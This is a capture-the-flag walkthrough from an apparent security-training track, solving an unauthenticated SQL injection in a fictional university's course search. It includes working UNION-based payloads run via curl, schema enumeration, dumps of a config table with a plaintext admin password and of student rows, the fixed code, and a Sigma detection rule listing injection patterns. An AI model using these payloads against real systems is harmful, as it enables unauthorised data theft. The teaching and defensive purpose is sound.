# level2@web — The Search Bar That Talks

**Track:** Web · **Client:** Meridian State University (continued) · **Compliance regime:** FERPA (20 U.S.C. § 1232g; 34 CFR Part 99)

> ⚠ This page contains the full solve path **and** the breadcrumb credential for a future `level3@web`. If you haven't solved `level2@web` yet, close this tab and come back after — the puzzle is much more satisfying without spoilers. This walkthrough assumes you've worked through `level0@web` and `level1@web`; it continues their narrative directly.

---

## §1 — The setup

Day three at Meridian State University. The level1 finding — Carlos's transcript endpoint handing out any student's record to any logged-in user (an IDOR / CWE-639) — closed the same afternoon. Carlos shipped the one-line ownership check, deleted the BluePier-era demo account that had been leaking a service credential through its `advisor_notes` field, and self-reported to Cedarwood Mutual (the cyber-insurance carrier) before Priya finished drafting the language. Two findings in two days, both remediated inside the audit window. Carlos is the easiest client Driftwood has.

While cleaning up the demo account, Carlos recovered the service credential it had been leaking — `portal-svc` / `meridian-portal-svc-2026` — and, on a hunch, checked the catalog webapp host. The same key was sitting in that host's `authorized_keys`. BluePier had wired one service account across multiple hosts back in 2021 and nobody ever pulled it apart. That credential reuse is the third finding of the engagement; note it for the writeup. It's also how you get a shell on the catalog host:

```
guest@d3cyph3r:~$ ssh level2@web
level2@web's password: meridian-portal-svc-2026
```

The prompt now reads `portal-svc@web:~$` — the lore host is `catalog.meridian.edu`. Today's target is the one piece of BluePier's 2021 work Carlos never rewrote: the public course-catalog search. It's the box prospective students use to browse Meridian's course list — no login required, and that part is correct. Course catalogs are public information. What's not correct is what BluePier did with the search term once it reached the server.

Priya, with Meridian's general counsel cc'd again, wants to know exactly how far that search box reaches. Her rules of engagement (in `priya-note.md`) are the same FERPA discipline as day two, with one sharpened edge:

> *"PROVE the vulnerability; do not harvest. Pull enough rows to demonstrate reach — a handful — and stop. Do NOT dump the full students table. 'I extracted 30,000 student records to prove a point' is not a sentence that survives a deposition. The cleanest proof is the app's OWN secrets — the config table — because it shows an attacker could seize the whole database without touching a single student record first. Lead the writeup with that."*

That's the scope: confirm injection, find the column count, enumerate the schema, dump the application's configuration table, and extract the credential that proves the blast radius — without harvesting student PII to do it.

Cross-track foreshadowing: the forensics track built a read-only SQLite query engine in `level2@forensics` (the `sqlite3` command) to *defend* — reconstructing what a suspect's browser did from on-disk databases. This level uses the same kind of SQL execution turned *offensive*: `curl` substitutes your input into the catalog's query and runs it for real. Same primitive, both sides of the table. And the prize — a production database credential sitting in plaintext in an application table — is the same "secret stored in the wrong place" antipattern that drove crypto's repo-committed hashes and cloud's migration-table credential. Different cause, same blast-radius math.

## §2 — The solve

The discipline this level teaches is patience with a methodology. SQL injection is not one trick; it's a sequence — probe, confirm, count columns, fingerprint, enumerate, extract — and each step earns the next. A tool like `sqlmap` automates the entire sequence in one command. Doing it by hand once is how you understand what the tool is doing, and why a single bound parameter on the server side would have made the whole thing a 404.

Every command quotes the whole URL so the shell doesn't split the spaces and quotes in the payload.

### Step 1: Use the breadcrumb to enter the box

```bash
guest@d3cyph3r:~$ ssh level2@web
level2@web's password: meridian-portal-svc-2026
```

The password is the `portal-svc` credential BluePier stashed in the M-0000001 demo account, recovered when Carlos decommissioned it after yesterday's IDOR finding. The same key turned out to be in the catalog host's `authorized_keys` — credential reuse across hosts, a finding in its own right. The connection banner identifies the host (`catalog.meridian.edu`) and the tier (Routine, ~22 min). Read `welcome.md` first — it explains what SQL injection is and lays out the order of operations.

### Step 2: Read the brief and the vulnerable source

```bash
portal-svc@web:~$ cat priya-note.md
portal-svc@web:~$ cat catalog-search.js
portal-svc@web:~$ cat deploy-notes.md
```

`priya-note.md` carries the rules of engagement above. `catalog-search.js` is the handler BluePier shipped — fifteen lines, and the vulnerability is one of them:

```javascript
router.get("/api/search", async (req, res) => {
  const q = req.query.q || "";

  // BluePier built the query by gluing the search term straight into
  // the SQL string. The term is NOT escaped or bound as a parameter.
  //   >>>  this is the vulnerability  <<<
  const sql =
    "SELECT sku, title, dept, credits FROM courses " +
    "WHERE title LIKE '%" + q + "%'";
  ...
```

The `"..." + q + "..."` concatenation is the entire bug. The search term `q` is glued into the middle of a string literal in the SQL. Whatever characters `q` contains become part of the query. The `catch` block at the bottom of the handler returns the raw database error and the constructed `sql` string to the client — a second finding (CWE-209) you'll see fire in a moment.[^cwe-209]

`deploy-notes.md` is the most important file you'll read. It establishes the blast radius before you've sent a single request:

- The catalog connects to the **same database** as the student portal (`meridian_portal`), as a user (`meridian_app`) granted **read/write on the entire schema** — including the `students` and `staff_users` tables.
- The catalog subdomain is **not** behind the Cloudflare WAF that fronts `www.meridian.edu`. There is **no WAF and no rate limiting** on `/api/search` (this is a bonus find).
- The database is **MySQL 5.7.38**, which reached [end-of-life on October 31, 2023](https://endoflife.date/mysql) — no security patches since.

### Step 3: Watch the endpoint behave normally

```bash
portal-svc@web:~$ curl "https://catalog.meridian.edu/api/search?q=biology"
{
  "results": [
    { "sku": "BIO-101", "title": "Introduction to Biology", "dept": "Biology", "credits": 4 },
    { "sku": "BIO-310", "title": "Cell Biology", "dept": "Biology", "credits": 3 }
  ],
  "count": 2
}
```

A normal search returns matching courses as JSON. The app renders every row under the column names `sku`, `title`, `dept`, `credits`. Remember those four columns — UNION-based extraction has to match them.

### Step 4: Probe with a single quote (CWE-209 bonus)

```bash
portal-svc@web:~$ curl "https://catalog.meridian.edu/api/search?q='"
{
  "status": "error",
  "message": "Database query failed",
  "error": "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%'' at line 1",
  "query": "SELECT sku, title, dept, credits FROM courses WHERE title LIKE '%'%'"
}

  ✦ Bonus find unlocked: Verbose database errors in production
```

This single response is two findings. **First:** the endpoint is injectable — a lone `'` produced a syntax error, which means your input is reaching the SQL parser as code, not data. **Second:** the application leaked the raw database error *and the exact query it built* straight to the HTTP response. That's CWE-209 (Generation of Error Message Containing Sensitive Information), and it turns blind trial-and-error into a guided exercise: you now know the backend is MySQL, you can see the query template, and you can read your own injection back to develop the payload. The bonus banner fires on this response.

### Step 5: Confirm with a tautology

```bash
portal-svc@web:~$ curl "https://catalog.meridian.edu/api/search?q=' OR 1=1-- -"
{ "results": [ ...every course in the catalog... ], "count": 8 }
```

The payload closes the string literal (`'`), adds a condition that's always true (`OR 1=1`), and comments out the rest of BluePier's query (`-- -`). The constructed query becomes `... WHERE title LIKE '%' OR 1=1` and every course returns. Injection confirmed.

A note on `-- -`: in MySQL, `--` only starts a comment when it's followed by whitespace or end-of-line. The trailing `-` after the space is the conventional way to make that required space visible and intentional — `-- ` (with a trailing space) works too, but the dash makes it obvious you meant it. `#` also works as a MySQL comment.

### Step 6: Count the columns

A UNION can only join two SELECTs that return the *same number of columns*. You don't know the count yet from the outside (the source confirmed four, but you'd determine it blind in a real engagement). Two techniques:

```bash
portal-svc@web:~$ curl "https://catalog.meridian.edu/api/search?q=zzz' ORDER BY 4-- -"
{ "results": [], "count": 0 }

portal-svc@web:~$ curl "https://catalog.meridian.edu/api/search?q=zzz' ORDER BY 5-- -"
{ "status": "error", "message": "Database query failed",
  "error": "Unknown column '5' in 'order clause'", ... }
```

`ORDER BY 4` is accepted; `ORDER BY 5` errors with *"Unknown column '5' in 'order clause'"*. The query has four columns. (`zzz` is a search term that matches no course, so the only rows you see are the ones you inject — cleaner output.) You can confirm the same count with `UNION SELECT NULL,NULL,NULL,NULL-- -` (accepted) versus three NULLs (errors with *"The used SELECT statements have a different number of columns"*).

### Step 7: Fingerprint the database

```bash
portal-svc@web:~$ curl "https://catalog.meridian.edu/api/search?q=zzz' UNION SELECT @@version,user(),database(),NULL-- -"
{
  "results": [
    { "sku": "5.7.38-0ubuntu0.18.04.1", "title": "meridian_app@localhost", "dept": "meridian_portal", "credits": null }
  ],
  "count": 1
}
```

The injected row surfaces in the app's normal output slots: `@@version` lands in `sku`, `user()` in `title`, `database()` in `dept`. You now have the exact server version (MySQL 5.7.38 — the EOL build the deploy notes mentioned), the database user the app connects as (`meridian_app`), and the current schema (`meridian_portal`). This is the moment "injected data surfaces where the page expected course data" clicks.

### Step 8: Enumerate the schema via information_schema

`information_schema` is SQL's own catalog — a set of virtual tables describing every other table. It's how you map a database you can't see:

```bash
portal-svc@web:~$ curl "https://catalog.meridian.edu/api/search?q=zzz' UNION SELECT table_name,NULL,NULL,NULL FROM information_schema.tables-- -"
{
  "results": [
    { "sku": "courses", ... },
    { "sku": "students", ... },
    { "sku": "staff_users", ... },
    { "sku": "app_config", ... }
  ],
  "count": 4
}
```

Four tables. `courses` is the one the search was meant to read. `students` is FERPA-protected records. `staff_users` is the auth table. `app_config` looks like configuration — and configuration is where credentials hide. List its columns:

```bash
portal-svc@web:~$ curl "https://catalog.meridian.edu/api/search?q=zzz' UNION SELECT column_name,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='app_config'-- -"
{ "results": [ { "sku": "config_key", ... }, { "sku": "config_value", ... } ], "count": 2 }
```

A simple key/value table.

### Step 9: Dump app_config — the credential (the level3 breadcrumb)

```bash
portal-svc@web:~$ curl "https://catalog.meridian.edu/api/search?q=zzz' UNION SELECT config_key,config_value,NULL,NULL FROM app_config-- -"
{
  "results": [
    { "sku": "app.name",          "title": "Meridian Course Catalog",         ... },
    { "sku": "smtp.host",         "title": "smtp.meridian.edu",                ... },
    { "sku": "smtp.user",         "title": "noreply@meridian.edu",             ... },
    { "sku": "session.secret",    "title": "kg9F2pX7qZ1mW4dR6tY8-rotate-me",   ... },
    { "sku": "db.host",           "title": "db.meridian.edu",                  ... },
    { "sku": "db.admin.user",     "title": "meridian_dbadmin",                 ... },
    { "sku": "db.admin.password", "title": "M3rid14n-DBr00t!2026",             ... },
    { "sku": "recaptcha.secret",  "title": "6Lc2k9wpAAAAAB-meridian-prod",     ... }
  ],
  "count": 8
}
```

There it is. `db.admin.password` = **`M3rid14n-DBr00t!2026`**, the password for `meridian_dbadmin` — the database's administrative account, stored in plaintext in a database table. This is the prize Priya asked you to lead with: you reached the database's own superuser credential through a public, unauthenticated search box, without touching a single student record. With that credential an attacker owns the entire `meridian_portal` database — every transcript, every grade, every record. It's also the breadcrumb to `level3@web`.

### Step 10: Demonstrate the FERPA blast radius (then stop)

To prove reach — a handful of rows, per the rules of engagement — the same injection pulls student records:

```bash
portal-svc@web:~$ curl "https://catalog.meridian.edu/api/search?q=zzz' UNION SELECT student_id,full_name,email,gpa FROM students-- -"
{
  "results": [
    { "sku": "M-1872941", "title": "Aisha Patel",  "dept": "patel.a@meridian.edu", "credits": 3.91 },
    { "sku": "M-1872995", "title": "Marcus Reyes", "dept": "reyes.m@meridian.edu", "credits": 3.42 },
    ...
  ]
}
```

Those are the same students from level0's exposed CSV — names, IDs, emails, GPAs, reachable from the open internet through a course search. Pull a handful, document it, and stop. (For contrast, dumping `staff_users` shows the staff passwords are bcrypt-hashed — `$2b$12$...` — so at least the auth table did it right. The plaintext DB-admin credential in `app_config` is the worse finding, and the point: even a well-hashed auth table doesn't matter when the database's master key is sitting in a config row.)

### Step 11: Return to the lobby with the finding

```bash
portal-svc@web:~$ exit
```

The deliverable is short and damning: a public, unauthenticated endpoint sharing a database with the student-records system; injection confirmed; the application's own database-admin credential extracted in plaintext; every FERPA-protected record reachable. The fix is one line (parameterize the query) plus four follow-ons (scope the DB account, stop leaking errors, rotate the credential, put the subdomain behind the WAF). Cedarwood Mutual needs it today.

## §3 — The vulnerability

The lesson in one sentence: **when an application builds a query by gluing untrusted input into the query string, the input stops being data and becomes code.**

The safe pattern keeps input and code separate by passing the input as a bound parameter:

```javascript
const sql = "SELECT sku, title, dept, credits FROM courses WHERE title LIKE ?";
const rows = await db.query(sql, ['%' + q + '%']);
```

The `?` is a placeholder. The database driver sends the query template and the parameter values over the wire *separately*; the value is never parsed as SQL. A single quote in the parameter stays a single quote — it can never close a string literal or introduce a keyword, because by the time it reaches the database, the query's structure is already fixed. This is "parameterized queries" / "prepared statements," and it is the complete fix. Not input sanitization, not escaping, not a denylist of bad words — parameterization, which makes the class of bug structurally impossible.

BluePier's handler did the opposite — string concatenation — and three failures stacked on top of it:

**Failure one — string-concatenated SQL (CWE-89).**[^cwe-89] The root cause. `"...LIKE '%" + q + "%'"`. Everything in §2 follows from this one line. It is the single most-documented web vulnerability in history, on the OWASP Top 10 in some form since the list's inception.

**Failure two — verbose errors in production (CWE-209).** The handler's `catch` block returned the raw DB error and the constructed query to the client. That hands an attacker the backend identity, the query shape, and a live feedback loop for payload development. Error detail belongs in server-side logs; clients get a generic "something went wrong."

**Failure three — an over-privileged, shared database account (CWE-250).**[^cwe-250] The public catalog connects with a user that can read every table in the portal schema, including FERPA records. A read-only account scoped to `courses` would have turned a catastrophic injection into a nuisance — you'd have broken the query and reached nothing worth reaching. Least privilege is the difference between "one table leaked" and "the whole institution leaked."

And the prize compounds a fourth: **the DB-admin credential stored in plaintext in a database table (CWE-312 / CWE-522).**[^cwe-312][^cwe-522] Credentials belong in a secrets manager, never in a row an injection can read.

A note on the threat landscape. In the [OWASP Top 10:2025](https://owasp.org/Top10/), Injection sits at **A05** — it dropped from A03:2021 (and from #1 in the 2013/2017 editions). That decline is real and it's good news: parameterized queries and ORMs are now the framework default, so classic SQLi is genuinely less common than it was a decade ago. But "less common" is not "gone," and when it lands the impact is total — as MOVEit (§4) demonstrated in 2023. Meridian's catalog is exactly the kind of code that slips through: a 2021 hand-built query, inherited and never rewritten, on a subdomain nobody re-reviewed.

## §3.5 — Blast radius

| Dimension | This finding |
|---|---|
| Reached | BluePier's 2021 course-search, which concatenates the query parameter straight into SQL |
| Authentication required | **None.** The search box is public and unauthenticated |
| Reachable via UNION | Four tables: `courses` as intended, plus `students`, `staff_users`, and `app_config` |
| Also disclosed | A plaintext database-admin credential in `app_config`, and verbose SQL errors (CWE-209) echoing the constructed query[^cwe-209] |
| Regime | FERPA education records (no notification duty, no fine schedule); any clock comes from state breach law attaching to the PII |

**Unauthenticated is the word that sets the severity.** Every other
finding in this track needs a session first. This one needs a browser.
The population of possible attackers is the internet, the skill floor is
a copied payload, and the reach extends to FERPA-protected records and
the authentication table in the same query.

**The credential in `app_config` outlives the injection fix.** Patching
the query stops the extraction path and does nothing about a plaintext
database-admin credential that has been reachable through a public search
box since 2021. Rotation and a review of what that account touched must
run in parallel with the code fix, not after it, or the attacker keeps a
key to a door that has just been locked.

**The verbose errors are a finding in their own right and the reason this
was tractable.** Echoing the constructed query back to the client turns
blind injection into a guided conversation, telling an attacker exactly
how their payload was parsed. It is also the single cheapest thing on this
page to fix: suppress the detail to the client, keep it in the server log,
and the same vulnerability becomes dramatically more expensive to
exploit.

**A note on the scoping discipline the engagement imposes.** Priya's
instruction was to prove reach and stop, and that is not squeamishness.
Pulling a handful of rows demonstrates the finding; harvesting the
students table would make Driftwood the party that exfiltrated FERPA
records. The proof and the harm are separated by where you choose to stop.

## §4 — Real-world parallels

**Heartland Payment Systems, 2008.** The Albert Gonzalez crew — the same group behind the TJX and 7-Eleven breaches — used SQL injection to plant backdoors on corporate networks and pivot to payment systems, where they installed packet sniffers. Heartland was among the targets; roughly 130 million card numbers were exposed, one of the largest payment breaches of its era. The lesson Meridian's catalog repeats: the injectable endpoint is rarely the valuable target itself — it's the doorway to the network behind it. [Wikipedia on Albert Gonzalez](https://en.wikipedia.org/wiki/Albert_Gonzalez) documents the SQL-injection methodology; [the Heartland breach article](https://en.wikipedia.org/wiki/Heartland_Payment_Systems#Security_breach) carries the scope.

**Sony Pictures, 2011 (LulzSec).** LulzSec used a single SQL injection against a Sony Pictures web property to extract users' names, passwords, email and home addresses, and dates of birth. It's the canonical example of a public web form with an unparameterized query behind it — one injectable parameter, the whole user table. [Wikipedia's LulzSec article](https://en.wikipedia.org/wiki/LulzSec) documents the incident.

**TalkTalk, 2015.** The UK telecom TalkTalk suffered a SQL injection breach exposing the personal data of over 156,000 customers. The UK Information Commissioner's Office fined TalkTalk £400,000 — at the time a record — stressing that the attack exploited a SQL-injection flaw "well understood for more than ten years," on an out-of-date database, that known defences would have stopped. This is the regulatory parallel for Meridian: TalkTalk's fine came not just from the breach but from the *preventability* — the same framing FERPA and Cedarwood Mutual will apply. The [ICO's account of the investigation](https://ico.org.uk/about-the-ico/media-centre/talktalk-cyber-attack-how-the-ico-investigation-unfolded/) is the primary source.

**MOVEit Transfer, 2023 (CVE-2023-34362).** The most consequential proof that SQL injection is not a solved problem: the Cl0p ransomware group exploited a SQL injection vulnerability in Progress Software's MOVEit Transfer file-transfer product to steal data from *thousands* of organizations — government agencies, universities, pension funds, corporations — affecting tens of millions of individuals. It was a textbook SQLi (untrusted input into a query) in widely-deployed enterprise software, in 2023. CISA issued an advisory; [the NVD entry for CVE-2023-34362](https://nvd.nist.gov/vuln/detail/CVE-2023-34362) and the [CISA advisory AA23-158A](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-158a) are the authoritative references. When OWASP says injection "dropped to A05 but stays on the list because the impact is total," MOVEit is the case they mean.

The through-line across all four: SQL injection's prevalence has fallen, but its blast radius has not. Every one of these started with a single endpoint that glued user input into a query.

## §5 — Frameworks, deep dive

**CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection').** The surgical CWE. It was **#3 on the CWE Top 25 Most Dangerous Software Weaknesses in both 2023 and 2024**. The catalog entry's primary mitigation is unambiguous: use a parameterized query API ("prepared statements"), and treat input validation as a secondary defense, never the primary one. ([MITRE CWE-89](https://cwe.mitre.org/data/definitions/89.html))

**CWE-209: Generation of Error Message Containing Sensitive Information.** The verbose error that returned the raw query and the DB version. The catalog entry recommends generic client-facing error messages with detail logged server-side only. ([MITRE CWE-209](https://cwe.mitre.org/data/definitions/209.html))

**CWE-250: Execution with Unnecessary Privileges.** The public catalog connecting as a user with read/write on the entire schema. A read-only account scoped to `courses` is the least-privilege fix. ([MITRE CWE-250](https://cwe.mitre.org/data/definitions/250.html))

**CWE-312 / CWE-522: Cleartext Storage of Sensitive Information / Insufficiently Protected Credentials.** The `meridian_dbadmin` password stored in plaintext in `app_config`. ([MITRE CWE-312](https://cwe.mitre.org/data/definitions/312.html), [CWE-522](https://cwe.mitre.org/data/definitions/522.html))

**OWASP Top 10:2025 — A05 Injection.** The umbrella category. Injection is A05 in the 2025 edition, down from A03:2021 (and from the #1 slot in the 2013 and 2017 editions). The decline reflects the industry-wide adoption of parameterized queries and ORMs — not that the bug is solved. ([OWASP Top 10:2025](https://owasp.org/Top10/))

**OWASP SQL Injection Prevention Cheat Sheet.** The single most-cited defender reference. Its primary defense is "use of prepared statements (with parameterized queries)"; secondary defenses are stored procedures, allow-list input validation, and escaping (in that priority order). ([OWASP Cheat Sheet Series — SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html))

**OWASP Web Security Testing Guide (WSTG).** The offensive-side reference: WSTG-INPV-05 (Testing for SQL Injection) documents the exact methodology this level walks — error-based probing, UNION-based extraction, `information_schema` enumeration. ([OWASP WSTG](https://owasp.org/www-project-web-security-testing-guide/))

**NIST SP 800-53 Rev. 5.**[^nist-800-53]
- **SI-10 (Information Input Validation)** — the control directly addressing injection: validate/neutralize input before it reaches an interpreter.
- **SI-11 (Error Handling)** — reveal as little as possible in error messages; the verbose error violates this directly.
- **AC-6 (Least Privilege)** — the catalog's database account had far more access than its function required.

([NIST SP 800-53 Rev. 5](https://csrc.nist.gov/pubs/sp/800/53/r5/upd1/final))

**CIS Critical Security Controls v8.1.** Control 16 (Application Software Security) is the home control — specifically **16.11 (Leverage Vetted Modules or Services for Application Security Components)**: use the framework's parameterized-query API rather than hand-building SQL. Control 3 (Data Protection) covers the plaintext credential. ([CIS Controls](https://www.cisecurity.org/controls/cis-controls-list))

**FERPA (20 U.S.C. § 1232g; 34 CFR Part 99).** The `students` table reachable through this injection is exactly the "education records" FERPA governs. §99.31 (conditions for disclosure of PII from education records) and §99.32 (recordkeeping for disclosures) are both failed: an injection-driven disclosure to an unknown party has no consent and no audit trail. FERPA's enforcement mechanism — withdrawal of federal funding — is existential for a public university, which is why this finding goes to the general counsel the same day. ([U.S. Dept. of Education — Student Privacy / FERPA](https://studentprivacy.ed.gov/ferpa))

**PortSwigger Web Security Academy — SQL injection.** The best free hands-on learning resource for this exact technique, including UNION attacks and `information_schema` enumeration, with interactive labs. ([PortSwigger — SQL injection](https://portswigger.net/web-security/sql-injection))

## §6 — Cert exam relevance

**CompTIA Security+ (SY0-701).**[^cert-security-plus] Domain 2 (Threats, Vulnerabilities, and Mitigations) names injection attacks directly, and Domain 4 covers input validation and secure coding as mitigations. ([CompTIA Security+](https://www.comptia.org/en-us/certifications/security/))

**CompTIA PenTest+ (PT0-003).**[^cert-pentest-plus] Domain 3 (Attacks and Exploits) covers SQL injection, UNION-based extraction, and `information_schema` enumeration; Domain 2 (Reconnaissance and Enumeration) covers the web-app testing that finds the injectable parameter. `sqlmap` is named tooling.

**CompTIA CySA+ (CS0-003 / CS0-004).**[^cert-cysa] CS0-004 launched on 23 June 2026; CS0-003 retires 22 December 2026. Injection-detection patterns appear in the threat-hunting and log-analysis modules — the SIEM signature for SQLi (anomalous query strings, error spikes) is on the exam.

**(ISC)² CISSP.**[^cert-cissp] Domain 8 (Software Development Security) — input validation, parameterized queries, and the secure-SDLC controls that catch this class are fundamentals.

**Offensive Security OSWA / OSWE / OSCP.**[^cert-oswe][^cert-oscp] SQL injection is a core skill across all three. The **OSWA (Web Assessor)** and **OSWE (Web Expert)** exams test exactly this hand-built UNION-extraction workflow; OSCP includes SQLi as a web-app foothold technique. ([OffSec certifications](https://www.offsec.com/courses/))

**EC-Council CEH v13.**[^cert-ceh] Module 15 (SQL Injection) is a dedicated module covering error-based, UNION-based, and blind SQLi plus `sqlmap` automation.

## §7 — What a defender does

**Parameterize the query.** This is the fix — not a mitigation, the fix. Prepared statements / bound parameters on every query, no exceptions. Every modern framework makes this the default path: parameterized queries in `mysql2`/`pg`/`better-sqlite3` for Node, the Django/Rails/Laravel/Spring ORMs, `PreparedStatement` in JDBC, parameterized `cursor.execute(sql, params)` in Python's DB-API. The opt-out (string concatenation) requires more code than the opt-in. There is no legitimate reason to build a query by concatenation in 2026.

**Scope the database account to least privilege.** The public catalog needs `SELECT` on `courses` and nothing else. A read-only account scoped to one table turns even a successful injection into a non-event. Treat every application's database credential as needing the minimum grant that lets the application function — never the schema-wide read/write BluePier configured.

**Stop returning errors to clients.** Return a generic 500 with a correlation ID; log the detail server-side. Never echo the query, the DB version, or the stack trace to an HTTP response. This closes CWE-209 and removes the attacker's feedback loop.[^cwe-209]

**Rotate the exposed credential and move it out of the database.** Treat `meridian_dbadmin` / `M3rid14n-DBr00t!2026` as burned the moment it appeared in a query response. Rotate it, then move it into a secrets manager ([AWS Secrets Manager](https://docs.aws.amazon.com/secretsmanager/latest/userguide/intro.html), [HashiCorp Vault](https://developer.hashicorp.com/vault/docs/secrets), [GCP Secret Manager](https://docs.cloud.google.com/secret-manager/docs), [Azure Key Vault](https://learn.microsoft.com/en-us/azure/key-vault/general/overview)). Credentials never belong in a database row an injection can read.

**Put the subdomain behind the WAF and add rate limiting.** A WAF is *not* a fix for injection — parameterizing is — but it raises the cost of automated discovery (sqlmap is noisy) and rate limiting bounds bulk extraction. Defense in depth, layered on top of the real fix, never instead of it.

**Upgrade off MySQL 5.7.** It reached [end-of-life October 31, 2023](https://endoflife.date/mysql); an unpatched database under a public injection is a compounding risk. Upgrade to a supported MySQL 8.x.

**Scan for the pattern in CI.** The "glue input into SQL" shape repeats across a codebase. [Semgrep](https://semgrep.dev/) and [CodeQL](https://codeql.github.com/) both ship SQL-injection rule packs that flag string-concatenated queries at the pull-request gate. Find every query built by concatenation, not just this one — and add a lint rule that fails the build on new ones.

### Sample detection rule (Sigma)

Union-based extraction leaves distinctive strings in the query string, and
because the endpoint is public and unauthenticated there is no session to
correlate against. The request itself is all the evidence there is.

```yaml
title: SQL injection patterns in a search query parameter
status: stable
description: >
  Detects union-based and schema-enumeration payloads in HTTP query
  parameters. The information_schema references are the strongest signal:
  a legitimate course search has no reason to name database metadata.
logsource:
  category: webserver
detection:
  union_extraction:
    cs-uri-query|contains:
      - 'union select'
      - 'union all select'
      - 'information_schema'
      - 'order by 1--'
  error_probing:
    cs-uri-query|contains:
      - "' or '1'='1"
      - "' and 1=2--"
      - 'sleep('
      - 'benchmark('
  condition: union_extraction or error_probing
falsepositives:
  - Course titles that genuinely contain these words. "Database Design"
    will not match, but a catalogue containing a course on SQL might
    produce a hit on a bare keyword, which is why the patterns above are
    multi-word rather than single tokens.
  - Authorised scanning. sqlmap is deliberately noisy and will generate
    many matches; correlate to the engagement schedule.
level: high
```

Verbose database errors are worth their own rule, and it is the cheaper
of the two. Alert on any response body containing a MySQL error code such
as `1064`, because that is the feedback loop turning blind injection into
a guided conversation. Suppressing those errors to the client is a
one-line change that makes the same vulnerability substantially more
expensive to exploit.

A caution for the report, though: pattern-matching on query strings is a
detection of *known payload shapes*, and encoding, comment insertion, and
case variation defeat it routinely. It belongs in the plan as a tripwire
while the query is being parameterised, never as the remediation itself.

## §7.5 — Optional exploration

Both bonus finds surface the conditions that made the injection worse than it had to be.

**Bonus find — Verbose database errors in production (CWE-209).** Triggered by the single-quote probe in Step 4. The endpoint returned the raw MySQL error *and* the exact SQL it tried to run. On its own a verbose error is "only" an information leak, but for an attacker developing a SQLi payload it's the difference between blind guessing and a guided exercise: it confirms the backend (MySQL), reveals the query template, and reads your injection back to you. The fix is decoupled from the injection fix — even a fully parameterized app should return generic client errors and log detail server-side. This is the lesson behind the rule "error messages are for your logs, not your users."

**Bonus find — Public endpoint with no WAF and no rate limiting.** Surfaced in `deploy-notes.md`. The catalog subdomain was stood up on a separate origin that BluePier never put behind the Cloudflare WAF that fronts the main site, and there's no rate limit on `/api/search`. A WAF wouldn't have *fixed* the injection (parameterizing does that), but its absence means an attacker — or an automated tool like sqlmap — can hammer the endpoint and the database directly, unthrottled, with no signature-based detection in front. The finding is a reminder that security controls applied to the "main" site don't automatically extend to every subdomain; each new origin needs the same baseline.

## §8 — Key takeaways

1. **String-concatenated SQL is the whole bug.** `"...LIKE '%" + q + "%'"` is the one line everything in §2 follows from. The fix is parameterized queries / prepared statements — the input is sent to the database separately from the query, so it can never become code.

2. **Parameterization is the fix, not a mitigation.** Input validation, escaping, and WAFs are defense in depth layered *on top* of parameterization — never instead of it. A bound parameter makes the bug class structurally impossible.

3. **Verbose errors turn blind guessing into guided extraction.** The leaked query and DB version (CWE-209) are a separate finding with a separate fix: generic client errors, detail in server logs only.

4. **Least privilege bounds the blast radius.** The catalog connecting with schema-wide read/write (CWE-250) is the difference between "one table leaked" and "every FERPA record leaked." A read-only account scoped to `courses` turns a catastrophic injection into a nuisance.

5. **Credentials never belong in a database row.** The plaintext `meridian_dbadmin` password in `app_config` (CWE-312/522) is reachable by exactly the injection that the credential's own database is vulnerable to. Secrets managers exist to eliminate this pattern.

6. **Injection's prevalence fell; its impact didn't.** It dropped to A05:2025 because parameterization is now the framework default — but MOVEit (2023) stole data from thousands of organizations through one SQLi. "Less common" is not "gone," especially in inherited 2021 code on an un-reviewed subdomain.

7. **For Meridian, this is a FERPA matter, today.** Every student record was reachable from the open internet through a public search box. FERPA's enforcement mechanism is loss of federal funding; the general counsel and Cedarwood Mutual both need this finding the same day, framed — as TalkTalk's regulator framed it — around its preventability.

The level3 credential — **`M3rid14n-DBr00t!2026`** — is the `meridian_dbadmin` database-superuser password, extracted in plaintext from the `app_config` table via the UNION injection. The breadcrumb isn't a leaked file this time; it's the *finding* — the application's own master database credential, reachable from a public search box, stored where an injection could read it.

## §9 — Further reading

*Last reviewed: August 2026. External standards versions and incident facts verified against current canonical sources as of this date. Report stale links via the project's GitHub issues tracker.*

**SQL injection — learn + prevent**


**Real-world cases**


**Frameworks + standards**


**Secrets management + SAST**


**MITRE ATT&CK references**


**CWE catalog**

[^nist-800-53]: [NIST SP 800-53 Rev. 5](https://csrc.nist.gov/pubs/sp/800/53/r5/upd1/final). — SI-10 (Input Validation), SI-11 (Error Handling), AC-6 (Least Privilege).
[^cwe-89]: [CWE-89 — SQL Injection](https://cwe.mitre.org/data/definitions/89.html).
[^cwe-209]: [CWE-209 — Error Message Containing Sensitive Information](https://cwe.mitre.org/data/definitions/209.html).
[^cwe-250]: [CWE-250 — Execution with Unnecessary Privileges](https://cwe.mitre.org/data/definitions/250.html).
[^cwe-312]: [CWE-312 — Cleartext Storage of Sensitive Information](https://cwe.mitre.org/data/definitions/312.html).
[^cwe-522]: [CWE-522 — Insufficiently Protected Credentials](https://cwe.mitre.org/data/definitions/522.html).
[^cert-cissp]: [ISC2 CISSP — certification exam outline](https://www.isc2.org/certifications/cissp/cissp-certification-exam-outline).
[^cert-security-plus]: [CompTIA Security+ — certification page and exam objectives](https://www.comptia.org/en-us/certifications/security/).
[^cert-cysa]: [CompTIA CySA+ — certification page and exam objectives](https://www.comptia.org/en-us/certifications/cybersecurity-analyst/).
[^cert-pentest-plus]: [CompTIA PenTest+ — certification page and exam objectives](https://www.comptia.org/en-us/certifications/pentest/).
[^cert-oscp]: [OffSec PEN-200 / OSCP — course syllabus and exam guide](https://www.offsec.com/courses/pen-200/).
[^cert-oswe]: [OffSec WEB-300 / OSWE — course syllabus](https://www.offsec.com/courses/web-300/).
[^cert-ceh]: [EC-Council CEH — Certified Ethical Hacker](https://www.eccouncil.org/train-certify/certified-ethical-hacker-ceh/).

### Further reading

- [PortSwigger Web Security Academy — SQL injection](https://portswigger.net/web-security/sql-injection). — the best free hands-on labs, including UNION attacks and information_schema enumeration.
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html). — the canonical defender reference; prepared statements first.
